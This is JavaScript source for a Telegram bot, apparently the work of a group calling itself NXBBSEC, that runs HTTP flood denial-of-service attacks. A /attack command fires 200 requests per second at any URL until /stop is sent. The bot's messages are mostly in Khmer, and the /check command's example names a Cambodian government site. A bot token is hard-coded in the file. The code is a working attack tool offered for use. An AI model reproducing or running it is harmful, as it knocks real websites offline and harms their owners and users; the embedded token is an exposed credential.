const os = require('os');
const TelegramBot = require('node-telegram-bot-api');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const telegramToken = '7837780403:AAGf8b4xzVaOedUZePHpqufIS4m4TdgqsGE';
const bot = new TelegramBot(telegramToken, { polling: true });

const defaultHeaders = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1'
};

function sendAttackRequest(targetUrl, headers) {
  return fetch(targetUrl, { headers })
    .then(response => {
      console.log(`⚡️ Attack BY NXBBSEC ⚡️ ${targetUrl}, STATUS: ${response.status}`);
      return response.status;
    })
    .catch(error => {
      console.error(`🛑 DOWN BY NXBBSEC 🛑 : ${error.message}`);
      throw error;
    });
}

let attackTimer = null;
const REQUESTS_PER_SECOND = 200;

bot.onText(/\/attack(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetUrl = match[1];

  if (!targetUrl || !targetUrl.startsWith('http')) {
    bot.sendMessage(chatId, 'សូមប្រើបញ្ជា:\n/attack [url]\nឧទាហរណ៍: /attack https://example.com');
    return;
  }

  if (attackTimer) {
    clearInterval(attackTimer);
    attackTimer = null;
  }

  // Get current time
  const now = new Date();
  const timeStr = now.toLocaleTimeString('en-GB', { hour12: false });
  const dateStr = `${now.getDate()}/${now.getMonth() + 1}/${now.getFullYear()}`;
  
  // Compose the attack message
  const attackMessage = `✅ 𝑨𝒕𝒕𝒂𝒄𝒌 Start attacking.
🌐 ម្ចាស់ផ្ទះ៖ ${targetUrl}
🔌 ច្រក: 443
🛠️ វិធីសាស្រ្ត៖ ទឹកជំនន់
🖥️ ម៉ាស៊ីនមេ៖ 1/2
🔁 ស្របគ្នាដោយឥតគិតថ្លៃ៖ 1/2
🔁 វីអាយភីស្របគ្នា៖ ០/៤
🔁 SieuVIP ស្របគ្នា៖ 0/3
🏆អ្នកប្រើប្រាស់៖ ឥតគិតថ្លៃ
⏰ ពេលវេលា៖ 120/120 ✅

🔐 ត្រាងថីប៖ បើក
🔐 របៀបbot: អនុញ្ញាត
🕒 រយៈពេល: ${timeStr} ${dateStr}`;

  await bot.sendMessage(chatId, attackMessage);

  // បង្ហាញពិនិត្យ URL
  const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(targetUrl)}`;
  await bot.sendMessage(chatId, `ពិនិត្យ URL:\n${checkHostUrl}`);

  attackTimer = setInterval(() => {
    for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
      sendAttackRequest(targetUrl, defaultHeaders).catch(() => {}); // បិទការចាប់ error ដើម្បីមិនឲ្យបញ្ហា interval
    }
  }, 1000);
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  if (attackTimer) {
    clearInterval(attackTimer);
    attackTimer = null;
    bot.sendMessage(chatId, '🛑 Bot បានឈប់វាយប្រហារ។');
  } else {
    bot.sendMessage(chatId, '🤖 មិនមានការវាយប្រហារកំពុងដំណើរការទេ។');
  }
});

bot.onText(/\/(start|help)/, (msg) => {
  bot.sendMessage(msg.chat.id, 'សូមប្រើបញ្ជា:\n/attack [url]\nឧទាហរណ៍: /attack https://example.com');
});

// បញ្ជាពិនិត្យ URL
bot.onText(/\/check(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url || !url.startsWith('http')) {
    bot.sendMessage(chatId, 'សូមប្រើបញ្ជា:\n/check [url]\nឧទាហរណ៍: /check https://www.mlvt.gov.kh/index.php/en/component/k2/content/39.html');
    return;
  }

  const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
  bot.sendMessage(chatId, `ពិនិត្យ URL:\n${checkHostUrl}`);
});
    
